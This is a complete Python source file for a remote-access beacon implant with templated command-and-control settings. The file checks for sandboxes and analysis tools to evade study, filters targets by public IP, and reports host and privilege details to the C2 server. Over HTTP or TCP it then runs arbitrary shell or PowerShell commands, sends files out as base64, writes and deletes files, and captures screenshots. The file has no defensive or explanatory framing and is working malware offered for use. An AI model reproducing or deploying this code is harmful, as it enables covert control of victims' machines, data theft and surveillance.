#!/usr/bin/env python3
import urllib.request
import urllib.error
import json
import os
import platform
import socket
import struct
import subprocess
import time
import random
import base64
import shutil

C2_URL = "{{C2_URL}}"
BEACON_ID = "{{BEACON_ID}}"
SLEEP = {{SLEEP}}
JITTER = {{JITTER}}
PROTO = "{{PROTO}}"
ALLOWED_IPS = "{{ALLOWED_IPS}}"
BLOCKED_IPS = "{{BLOCKED_IPS}}"


# ==================== SANDBOX DETECTION ====================

SANDBOX_PROCS = [
    "wireshark", "fiddler", "procmon", "procmon64", "procexp", "procexp64",
    "x32dbg", "x64dbg", "ollydbg", "windbg", "idaq", "idaq64",
    "autoruns", "pestudio", "sandboxie", "sbiectrl",
    "cuckoomon", "joeboxcontrol", "joeboxserver",
    "dumpcap", "httpdebugger", "fakenet", "apimonitor",
    "strace", "ltrace", "gdb", "sysdig",
]

SANDBOX_HOSTNAMES = [
    "SANDBOX", "CUCKOO", "TEQUILA",
    "FVFF1M7J", "WILEYPC", "INTELPRO",
    "FLAREVM", "TPMNOTIFY", "REMNUX",
]

SANDBOX_USERS = [
    "sandbox", "cuckoo", "currentuser", "wdagutilityaccount",
    "hapubws", "maltest", "malnetvm", "yfkol", "remnux",
]


def is_sandbox():
    try:
        hn = platform.node().upper()
        un = (os.getenv("USERNAME") or os.getenv("USER", "")).lower()
        for p in SANDBOX_HOSTNAMES:
            if hn == p:
                return True
        for p in SANDBOX_USERS:
            if un == p:
                return True

        if platform.system() == "Windows":
            try:
                r = subprocess.run(
                    ["tasklist", "/fo", "csv", "/nh"],
                    capture_output=True, text=True, timeout=10,
                )
                procs = r.stdout.lower()
                for p in SANDBOX_PROCS:
                    if p in procs:
                        return True
            except Exception:
                pass

            try:
                import ctypes
                k32 = ctypes.windll.kernel32
                uptime_ms = k32.GetTickCount64()
                if uptime_ms < 30 * 60 * 1000:
                    return True
            except Exception:
                pass

            # Check TEMP dir file count
            try:
                tmp = os.getenv("TEMP") or os.getenv("TMP", "")
                if tmp and len(os.listdir(tmp)) < 10:
                    return True
            except Exception:
                pass

            # Check sandbox services
            try:
                for svc in ["SbieSvc", "CuckooMon", "Joeboxserver", "cmdvirth"]:
                    r = subprocess.run(["sc", "query", svc], capture_output=True, text=True, timeout=5)
                    if "RUNNING" in r.stdout:
                        return True
            except Exception:
                pass

        else:
            # Linux uptime check
            try:
                with open("/proc/uptime") as f:
                    uptime_sec = float(f.read().split()[0])
                if uptime_sec < 1800:
                    return True
            except Exception:
                pass

        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            return True

        # RAM check
        if platform.system() == "Windows":
            try:
                import ctypes

                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ("dwLength", ctypes.c_ulong),
                        ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                    ]

                mem = MEMORYSTATUSEX()
                mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
                if mem.ullTotalPhys < 2 * 1024 * 1024 * 1024:
                    return True
            except Exception:
                pass
        else:
            try:
                with open("/proc/meminfo") as f:
                    for line in f:
                        if line.startswith("MemTotal:"):
                            mem_kb = int(line.split()[1])
                            if mem_kb < 2 * 1024 * 1024:
                                return True
                            break
            except Exception:
                pass

    except Exception:
        pass
    return False


def check_ip_filter():
    if not ALLOWED_IPS and not BLOCKED_IPS:
        return True
    try:
        req = urllib.request.Request("http://api.ipify.org")
        resp = urllib.request.urlopen(req, timeout=5)
        public_ip = resp.read().decode().strip()
    except Exception:
        try:
            req = urllib.request.Request("http://ifconfig.me/ip")
            resp = urllib.request.urlopen(req, timeout=5)
            public_ip = resp.read().decode().strip()
        except Exception:
            return True  # fail-open
    try:
        import ipaddress
        ip = ipaddress.ip_address(public_ip)
        if BLOCKED_IPS:
            for entry in BLOCKED_IPS.split("|"):
                entry = entry.strip()
                if not entry:
                    continue
                if "/" in entry:
                    if ip in ipaddress.ip_network(entry, strict=False):
                        return False
                elif str(ip) == entry:
                    return False
        if ALLOWED_IPS:
            for entry in ALLOWED_IPS.split("|"):
                entry = entry.strip()
                if not entry:
                    continue
                if "/" in entry:
                    if ip in ipaddress.ip_network(entry, strict=False):
                        return True
                elif str(ip) == entry:
                    return True
            return False
    except Exception:
        pass
    return True


def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def check_admin():
    if platform.system() == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        return os.getuid() == 0


def get_host_info():
    return {
        "beacon_id": BEACON_ID,
        "hostname": platform.node(),
        "username": os.getenv("USERNAME") or os.getenv("USER", "unknown"),
        "domain": os.getenv("USERDOMAIN", ""),
        "os": platform.system() + " " + platform.machine(),
        "arch": "amd64" if platform.machine() in ("x86_64", "AMD64") else "386",
        "pid": os.getpid(),
        "process_name": os.path.basename(__file__),
        "is_admin": check_admin(),
        "internal_ip": get_internal_ip(),
        "sleep": SLEEP,
        "jitter": JITTER,
    }


def execute_command(cmd):
    cmd_lower = cmd.strip().lower()

    if cmd_lower in ("pwd", "cwd"):
        return os.getcwd()

    if cmd_lower.startswith("cd "):
        target = cmd[3:].strip()
        try:
            os.chdir(target)
            return "Changed directory to: " + os.getcwd()
        except Exception as e:
            return "Error: " + str(e)

    if cmd_lower in ("whoami", "getuid"):
        user = os.getenv("USERNAME") or os.getenv("USER", "unknown")
        host = platform.node()
        return "User: %s\nHostname: %s\nPID: %d" % (user, host, os.getpid())

    # File operation commands
    if cmd.startswith("__FILELIST__ "):
        return file_list(cmd[13:].strip())

    if cmd.startswith("__FILEREAD__ "):
        return file_read(cmd[13:].strip())

    if cmd.startswith("__FILEUPLOAD__ "):
        rest = cmd[15:].strip()
        idx = rest.find(" ")
        if idx < 0:
            return json.dumps({"error": "usage: __FILEUPLOAD__ <path> <base64data>"})
        return file_upload(rest[:idx], rest[idx + 1:])

    if cmd.startswith("__MKDIR__ "):
        return file_mkdir(cmd[10:].strip())

    if cmd.startswith("__DELETE__ "):
        return file_delete(cmd[10:].strip())

    if cmd.strip() == "__SCREENSHOT__":
        return capture_screenshot()

    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
                capture_output=True, text=True, timeout=120
            )
        else:
            result = subprocess.run(
                ["/bin/sh", "-c", cmd],
                capture_output=True, text=True, timeout=120
            )
        output = result.stdout
        if result.stderr:
            output += "\n" + result.stderr
        return output
    except subprocess.TimeoutExpired:
        return "Error: command timed out"
    except Exception as e:
        return "Error: " + str(e)


def file_list(dir_path):
    try:
        if not dir_path:
            dir_path = "."
        if dir_path == "__DRIVES__":
            return list_drives()
        abs_path = os.path.abspath(dir_path)
        items = []
        for name in os.listdir(abs_path):
            full = os.path.join(abs_path, name)
            try:
                st = os.stat(full)
                items.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": st.st_size,
                    "mod_time": time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(st.st_mtime))
                })
            except Exception:
                continue
        return json.dumps({"path": abs_path, "items": items})
    except Exception as e:
        return json.dumps({"error": str(e)})


def list_drives():
    if platform.system() != "Windows":
        return file_list("/")
    drives = []
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        dp = letter + ":\\"
        if os.path.exists(dp):
            drives.append({"name": letter + ":", "is_dir": True, "size": 0, "mod_time": ""})
    return json.dumps({"path": "__DRIVES__", "items": drives})


def file_read(file_path):
    try:
        abs_path = os.path.abspath(file_path)
        size = os.path.getsize(abs_path)
        if size > 50 * 1024 * 1024:
            return json.dumps({"error": "file too large (>50MB)"})
        with open(abs_path, "rb") as f:
            data = f.read()
        return json.dumps({"path": abs_path, "size": size, "base64": base64.b64encode(data).decode()})
    except Exception as e:
        return json.dumps({"error": str(e)})


def file_upload(file_path, b64_data):
    try:
        abs_path = os.path.abspath(file_path)
        data = base64.b64decode(b64_data)
        parent = os.path.dirname(abs_path)
        os.makedirs(parent, exist_ok=True)
        with open(abs_path, "wb") as f:
            f.write(data)
        return json.dumps({"status": "ok", "path": abs_path, "size": len(data)})
    except Exception as e:
        return json.dumps({"error": str(e)})


def file_mkdir(dir_path):
    try:
        abs_path = os.path.abspath(dir_path)
        os.makedirs(abs_path, exist_ok=True)
        return json.dumps({"status": "ok", "path": abs_path})
    except Exception as e:
        return json.dumps({"error": str(e)})


def file_delete(target_path):
    try:
        abs_path = os.path.abspath(target_path)
        if os.path.isdir(abs_path):
            shutil.rmtree(abs_path)
        else:
            os.remove(abs_path)
        return json.dumps({"status": "ok", "path": abs_path})
    except Exception as e:
        return json.dumps({"error": str(e)})


def capture_screenshot():
    """Capture a screenshot and return as base64 PNG with SCREENSHOT: prefix"""
    try:
        if platform.system() == "Windows":
            return _screenshot_windows()
        else:
            return _screenshot_linux()
    except Exception as e:
        return "Error: screenshot failed: " + str(e)


def _screenshot_windows():
    """Windows screenshot using ctypes and GDI32 - captures all monitors"""
    import ctypes
    import struct

    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    SM_XVIRTUALSCREEN = 76
    SM_YVIRTUALSCREEN = 77
    SM_CXVIRTUALSCREEN = 78
    SM_CYVIRTUALSCREEN = 79
    SRCCOPY = 0x00CC0020
    BI_RGB = 0
    DIB_RGB_COLORS = 0

    # Virtual screen = all monitors combined
    src_x = user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
    src_y = user32.GetSystemMetrics(SM_YVIRTUALSCREEN)
    width = user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
    height = user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)
    if width == 0 or height == 0:
        return "Error: failed to get screen dimensions"

    hwnd = user32.GetDesktopWindow()
    hdc = user32.GetDC(0)  # NULL = entire virtual screen
    if not hdc:
        return "Error: failed to get device context"

    mem_dc = gdi32.CreateCompatibleDC(hdc)
    if not mem_dc:
        user32.ReleaseDC(hwnd, hdc)
        return "Error: failed to create compatible DC"

    hbmp = gdi32.CreateCompatibleBitmap(hdc, width, height)
    if not hbmp:
        gdi32.DeleteDC(mem_dc)
        user32.ReleaseDC(hwnd, hdc)
        return "Error: failed to create bitmap"

    old = gdi32.SelectObject(mem_dc, hbmp)
    gdi32.BitBlt(mem_dc, 0, 0, width, height, hdc, src_x, src_y, SRCCOPY)

    bmi_header = struct.pack(
        '<IiiHHIIiiII',
        40, width, -height, 1, 32, BI_RGB, 0, 0, 0, 0, 0
    )

    pixel_size = width * height * 4
    pixels = ctypes.create_string_buffer(pixel_size)
    bmi = ctypes.create_string_buffer(bmi_header + b'\x00' * 4)

    gdi32.GetDIBits(mem_dc, hbmp, 0, height, pixels, bmi, DIB_RGB_COLORS)

    gdi32.SelectObject(mem_dc, old)
    gdi32.DeleteObject(hbmp)
    gdi32.DeleteDC(mem_dc)
    user32.ReleaseDC(hwnd, hdc)

    raw = pixels.raw
    file_size = 14 + 40 + pixel_size
    bmp_file_header = struct.pack(
        '<2sIHHI', b'BM', file_size, 0, 0, 14 + 40
    )
    bmp_info_header = struct.pack(
        '<IiiHHIIiiII', 40, width, -height, 1, 32, BI_RGB, pixel_size, 0, 0, 0, 0
    )

    bmp_data = bmp_file_header + bmp_info_header + raw
    return "SCREENSHOT:" + base64.b64encode(bmp_data).decode()


def _screenshot_linux():
    """Linux screenshot using available tools"""
    import tempfile
    tmp = tempfile.mktemp(suffix='.png')
    tools = [
        ['import', '-window', 'root', tmp],
        ['scrot', tmp],
        ['gnome-screenshot', '-f', tmp],
        ['xfce4-screenshooter', '--fullscreen', '--save', tmp],
        ['maim', tmp],
    ]
    for tool_cmd in tools:
        try:
            if shutil.which(tool_cmd[0]) is None:
                continue
            subprocess.run(tool_cmd, capture_output=True, timeout=10)
            if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
                with open(tmp, 'rb') as f:
                    data = f.read()
                os.remove(tmp)
                return "SCREENSHOT:" + base64.b64encode(data).decode()
        except Exception:
            continue
    try:
        os.remove(tmp)
    except Exception:
        pass
    return "Error: no screenshot tool available"


def sleep_with_jitter():
    jitter_range = SLEEP * (JITTER / 100.0)
    actual_sleep = SLEEP + random.uniform(-jitter_range, jitter_range)
    if actual_sleep < 0.5:
        actual_sleep = 0.5
    time.sleep(actual_sleep)


# ==================== HTTP MODE ====================

def http_post(url, data):
    try:
        body = json.dumps(data).encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read().decode()
    except Exception:
        return ""


def http_register():
    resp = http_post(C2_URL + "/checkin", get_host_info())
    if resp == "__TERMINATE__":
        os._exit(0)


def http_send_result(task_id, output):
    http_post(C2_URL + "/checkin", {"task_id": task_id, "output": output})


def http_checkin():
    global SLEEP, JITTER
    try:
        req = urllib.request.Request(
            C2_URL + "/checkin?id=" + BEACON_ID,
            headers={
                "X-Beacon-ID": BEACON_ID,
                "X-Beacon-OS": platform.system() + " " + platform.machine(),
            }
        )
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode()

        if body == "__TERMINATE__":
            os._exit(0)

        if body.startswith("SLEEP "):
            parts = body.split()
            if len(parts) >= 3:
                SLEEP = int(parts[1])
                JITTER = int(parts[2])
            return

        try:
            tasks = json.loads(body)
            if isinstance(tasks, list):
                for task in tasks:
                    cmd = task.get("command", "")
                    task_id = task.get("id", "")
                    if cmd == "__EXIT__":
                        http_send_result(task_id, "BEACON_TERMINATED")
                        os._exit(0)
                    output = execute_command(cmd)
                    http_send_result(task_id, output)
        except (json.JSONDecodeError, ValueError):
            pass
    except Exception:
        pass


def run_http():
    http_register()
    while True:
        sleep_with_jitter()
        http_checkin()


# ==================== TCP MODE ====================

def tcp_write_msg(sock, msg):
    """Send length-prefixed JSON message"""
    data = json.dumps(msg).encode()
    sock.sendall(struct.pack(">I", len(data)) + data)


def tcp_read_msg(sock):
    """Read length-prefixed JSON message"""
    header = b""
    while len(header) < 4:
        chunk = sock.recv(4 - len(header))
        if not chunk:
            raise ConnectionError("Connection closed")
        header += chunk
    length = struct.unpack(">I", header)[0]
    if length > 10 * 1024 * 1024:
        raise ValueError("Message too large")
    data = b""
    while len(data) < length:
        chunk = sock.recv(min(length - len(data), 65536))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return json.loads(data.decode())


def run_tcp():
    global SLEEP, JITTER
    # Parse host:port from C2_URL
    parts = C2_URL.rsplit(":", 1)
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 4444

    while True:
        try:
            sock = socket.create_connection((host, port), timeout=10)
        except Exception:
            sleep_with_jitter()
            continue

        try:
            # Register
            tcp_write_msg(sock, {"type": "register", "data": get_host_info()})
            ack = tcp_read_msg(sock)
            if ack.get("type", "") == "terminate":
                sock.close()
                os._exit(0)

            # Main loop
            while True:
                sleep_with_jitter()

                tcp_write_msg(sock, {"type": "checkin"})
                resp = tcp_read_msg(sock)

                msg_type = resp.get("type", "")

                if msg_type == "terminate":
                    sock.close()
                    os._exit(0)

                elif msg_type == "tasks":
                    tasks = resp.get("data", [])
                    for task in tasks:
                        cmd = task.get("command", "")
                        task_id = task.get("id", "")
                        if cmd == "__EXIT__":
                            tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": "BEACON_TERMINATED"}})
                            tcp_read_msg(sock)
                            sock.close()
                            os._exit(0)
                        output = execute_command(cmd)
                        tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": output}})
                        tcp_read_msg(sock)  # ack

                elif msg_type == "sleep":
                    cfg = resp.get("data", {})
                    if cfg.get("sleep", 0) > 0:
                        SLEEP = cfg["sleep"]
                    if cfg.get("jitter", -1) >= 0:
                        JITTER = cfg["jitter"]

        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

        sleep_with_jitter()


# ==================== MAIN ====================

if __name__ == "__main__":
    time.sleep(10)
    if is_sandbox():
        os._exit(0)
    if not check_ip_filter():
        os._exit(0)
    if PROTO == "tcp":
        run_tcp()
    else:
        run_http()
